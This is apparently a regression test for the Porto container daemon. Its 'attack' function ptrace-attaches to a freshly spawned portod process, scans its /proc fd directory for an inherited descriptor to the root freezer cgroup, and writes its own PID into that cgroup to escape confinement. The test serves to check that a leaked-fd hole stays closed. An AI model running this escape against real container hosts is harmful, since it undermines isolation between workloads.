#include <iostream>
#include <sstream>
#include <fstream>
#include <cerrno>
#include <chrono>

#include "libporto.hpp"
#include "test.hpp"

extern "C" {
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <string.h>
#include <unistd.h>
#include <fts.h>
}

using std::cout;
using std::cerr;
using std::endl;

using std::string;
using std::stringstream;

using std::ofstream;

using std::unique_ptr;

using std::chrono::steady_clock;
using std::chrono::seconds;

/*
Return
    0 on success attack,
    1 on attack fail,
    2 on internal error
*/
int attack(int selfPid, int targetPid, seconds timeout = seconds(3)) {
    cout << "Tracing process " << targetPid << endl;

    auto start = steady_clock::now();

    while (true) {
        if (ptrace(PTRACE_ATTACH, targetPid, nullptr, nullptr)) {
            if (errno == ESRCH) {
                if (steady_clock::now() - start >= timeout) {
                    cerr << "Timeout expired while trying ptrace(PTRACE_ATTACH)" << endl;
                    return 1;
                }
                continue;
            }

            cerr << "ptrace(PTRACE_ATTACH): " << strerror(errno) << endl;
            return 1;
        }
        break;
    }

    cout << "Waiting for process" << endl;
    wait(nullptr);

    stringstream ss;
    ss << "/proc/" << targetPid << "/fd";
    char *paths[] = { const_cast<char *>(ss.str().c_str()), nullptr };
    unique_ptr<FTS, int(*)(FTS*)> fts(fts_open(paths, FTS_PHYSICAL, nullptr), fts_close);
    if (!fts) {
        cerr << "fts_open(" << ss.str() << "): " << strerror(errno) << endl;
        return 2;
    }

    string freezerPath;
    cout << "Available fds:" << endl;
    while (true) {
        FTSENT *ent = fts_read(fts.get());
        if (ent == nullptr) {
            if(errno == 0) {
                break;
            } else {
                cerr << "fts_read(): " << strerror(errno) << endl;
                return 2;
            }
        }

        if (!ent->fts_pathlen || ent->fts_pathlen == ent->fts_namelen) {
            continue;
        }

        if (ent->fts_info == FTS_SL) {
            string realPath(256, 0);
            ssize_t size = readlink(ent->fts_path, const_cast<char *>(realPath.data()), realPath.capacity());
            if (size < 0) {
                cerr << "readlink(" << ent->fts_path << "): " << strerror(errno) << endl;
                return 2;
            }
            realPath.resize(size);

            cout << ent->fts_path << " -> " << realPath << endl;
            if (realPath == "/sys/fs/cgroup/freezer") {
                freezerPath = ent->fts_path;
            }
        }
    }

    if (freezerPath.empty()) {
        cerr << "Failed to find freezer cgroup fd" << endl;
        return 2;
    }

    cout << "Found freezer cgroup fd: " << freezerPath << endl;
    ofstream out(freezerPath + "/tasks");
    out << selfPid;

    cout << "Moved " << selfPid << " into root freezer cgroup" << endl;

    if (ptrace(PTRACE_DETACH, targetPid, nullptr, nullptr)) {
        cerr << "ptrace(PTRACE_DETACH): " << strerror(errno) << endl;
        return 2;
    }

    return 0;
}

int main() {
    int selfPid = getpid();
    int targetPid = selfPid + 2;
    cout << "Wait for portod with pid " << targetPid << endl;

    int pipefd[2];
    char buf[1];
    if (pipe(pipefd) < 0) {
        cerr << "pipe(): " << strerror(errno) << endl;
        return 2;
    }

    int pid = fork();
    if (pid) {
        close(pipefd[0]);
        if (write(pipefd[1], buf, 1) != 1) {
            cerr << "Failed to write 1 byte to pipe: " << strerror(errno) << endl;
            return 2;
        }

        int ret = attack(selfPid, targetPid);
        int status;
        ExpectEq(waitpid(pid, &status, 0), pid);
        ExpectEq(WEXITSTATUS(status), 0);
        return ret;
    } else {
        close(pipefd[1]);
        if (read(pipefd[0], buf, 1) != 1) {
            cerr << "Failed to read 1 byte from pipe: " << strerror(errno) << endl;
            return 2;
        }

        string containerName = "test" + std::to_string(time(nullptr));
        cout << "Create container: " << containerName << endl;

        Porto::Connection api;
        ExpectApiSuccess(api.Create(containerName));
        ExpectApiSuccess(api.SetProperty(containerName, "command", "echo"));
        ExpectApiSuccess(api.SetProperty(containerName, "isolate", "false"));

        cout << "Start container" << endl;
        ExpectApiSuccess(api.Start(containerName));
        string name;
        cout << "Wait container" << endl;
        ExpectApiSuccess(api.WaitContainers({containerName}, {}, name));
        ExpectEq(containerName, name);
        ExpectApiSuccess(api.Destroy(containerName));

        return 0;
    }
}
